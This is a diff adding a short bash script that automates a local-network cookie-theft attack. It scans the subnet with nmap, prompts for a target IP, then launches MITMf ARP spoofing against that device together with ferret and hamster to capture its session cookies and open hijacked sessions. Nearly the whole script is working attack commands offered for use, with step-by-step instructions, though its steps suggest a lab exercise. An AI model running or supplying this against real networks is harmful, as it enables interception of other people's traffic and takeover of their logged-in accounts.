@@ -1,0 +1,31 @@
+#!/bin/bash
+echo "Script Description: This script uses MITMf, hamster and ferret to steal any cookies stored in a target device"
+echo ~~Tools required :
+echo "	1-MITMf: apt-get install mitmf"
+echo "	2-ferret: apt-get install ferret-sidejack"
+echo "	3-hamster: apt-get install hamster"
+
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+echo "~~Scanning for connected devices \"nmap -sn $defGateway/24\""
+nmap -sn $defGateway/24
+read -p "~~Enter target device IP: " ClientIP
+echo ~~Steps to follow: 
+echo "	1-Login to any website on the target device and save your login information using the “remember me” feature."
+echo "	2-MITMf, ferret, hamster will be started automatically."
+echo "	3-Go to MITMf tab and provide the required information to continue."
+echo "	3-Open the website you already saved its login information."
+echo "	4-Modify the Kali browser proxy to use “hamster”, by setting the proxy to 127.0.0.1:1234"
+echo "	5-Navigate to the URL given by “hamster”, and find the target device cookies."
+echo "	6-Open any Hijacked session in a new tab"
+terminator --new-tab  -e "mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName" &
+terminator --new-tab -e "ferret -i $interfaceName" &
+terminator --new-tab -e "hamster" > SessionHijacking-hamster-output &
+
+
+
+
